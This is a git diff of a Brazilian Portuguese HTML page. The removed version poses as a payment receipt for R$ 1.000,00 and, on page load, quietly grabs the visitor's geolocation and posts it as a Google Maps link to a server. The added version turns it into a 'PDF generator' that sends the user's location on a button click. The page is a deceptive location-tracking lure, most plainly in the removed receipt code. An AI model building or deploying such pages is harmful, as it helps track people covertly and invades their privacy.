@@ -2,53 +2,57 @@
 <html lang="pt-BR">
 
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Recebimento</title>
-  <link rel="stylesheet" href="styles.css" />
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Gerar PDF com Localização</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 2rem;
+    }
+
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      background-color: royalblue;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: darkblue;
+    }
+  </style>
 </head>
 
 <body>
-  <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
-
-    <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
-    </div>
-
-    <button class="botao" onclick="window.print()">Imprimir</button>
-
-    <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
-    </div>
-
-  </div>
+  <h1>Gerador de PDF</h1>
+  <p>Clique no botão abaixo para gerar um PDF com um texto aleatório e enviar sua localização.</p>
+  <button onclick="gerarPDF()">Gerar PDF e Enviar Localização</button>
 
   <script>
-    window.addEventListener("load", () => {
+    async function gerarPDF() {
+      const textoAleatorio = "Este é um texto aleatório para teste de geração de PDF via JavaScript no navegador.";
+
+      // Gerar PDF com jsPDF
+      const { jsPDF } = window.jspdf;
+      const doc = new jsPDF();
+      doc.text(textoAleatorio, 10, 20);
+      doc.save("texto-aleatorio.pdf");
+
+      // Obter e enviar localização
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+        navigator.geolocation.getCurrentPosition(enviarLocalizacao, handleError);
       } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+        alert("Seu navegador não suporta geolocalização.");
       }
-    });
+    }
 
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
-
-    function sendLocation(position) {
+    function enviarLocalizacao(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
@@ -62,17 +66,19 @@
       })
         .then(response => response.json())
         .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
+          if (data.success) {
+            console.log("Localização enviada com sucesso!");
+          } else {
+            alert("Erro ao enviar localização.");
           }
         })
         .catch(error => {
-          console.error("Erro:", error);
+          console.error("Erro ao enviar localização:", error);
         });
     }
 
     function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+      alert("Erro ao obter localização: " + error.message);
     }
   </script>
 </body>
